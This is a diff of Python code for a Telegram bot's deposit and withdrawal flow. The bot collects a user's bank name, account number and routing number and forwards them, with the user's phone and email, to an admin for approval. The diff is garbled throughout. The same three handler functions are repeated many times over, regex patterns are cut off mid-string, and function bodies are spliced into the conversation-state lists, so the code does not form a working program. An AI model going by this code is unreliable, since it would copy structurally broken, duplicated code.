-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             DEPOSIT_PROOF: [
                 MessageHandler(filters.PHOTO, get_deposit_proof),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             WITHDRAW_AMOUNT: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_withdraw_amount),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             WITHDRAW_CRYPTO_ADDRESS: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_crypto_address),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             WITHDRAW_BANK_NAME: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank_name),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             WITHDRAW_ACCOUNT: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_account_number),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
